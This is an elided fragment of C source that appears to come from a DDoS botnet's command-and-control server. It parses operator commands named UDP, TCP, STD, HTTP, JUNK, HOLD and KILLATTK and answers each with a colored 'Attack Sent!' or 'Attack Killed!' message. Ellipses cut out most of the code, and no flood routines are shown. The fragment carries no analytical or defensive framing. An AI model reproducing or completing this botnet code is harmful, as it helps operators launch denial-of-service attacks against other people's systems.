    ...
    while(j!=i-1) {
		...
		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
            ...
            if(strstr(buf, "UDP")) {
				...
				sprintf(udp_sent_attack_message, "\x1b[31mAttack Sent!\r\n");
			...
			if(strstr(buf, "TCP")) {
				...
				sprintf(tcp_sent_attack_message, "\x1b[31mAttack Sent!\r\n");
				if(send(datafd, tcp_sent_attack_message, strlen(tcp_sent_attack_message), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "STD")) {
                char std_sent_attack_message[2048];
                memset(std_sent_attack_message, 0, 2048);
                sprintf(std_sent_attack_message, "\x1b[31mAttack Sent!\r\n");
                if(send(datafd, std_sent_attack_message, strlen(std_sent_attack_message), MSG_NOSIGNAL) == -1) goto end;
                continue;
			}
			if(strstr(buf, "HTTP")) {
				char http_sent_attack_message[2048];
				memset(http_sent_attack_message, 0, 2048);
				sprintf(http_sent_attack_message, "\x1b[31mAttack Sent!\r\n");
			...
			if(strstr(buf, "JUNK")) {
				...
				sprintf(junk_sent_attack_message, "\x1b[31mAttack Sent!\r\n");
			...
			if(strstr(buf, "HOLD")) {
				...
				sprintf(hold_sent_attack_message, "\x1b[31mAttack Sent!\r\n");
			...
			if(strstr(buf, "KILLATTK")) {
				...
				sprintf(killattack_message, "\x1b[31mAttack Killed!\r\n");
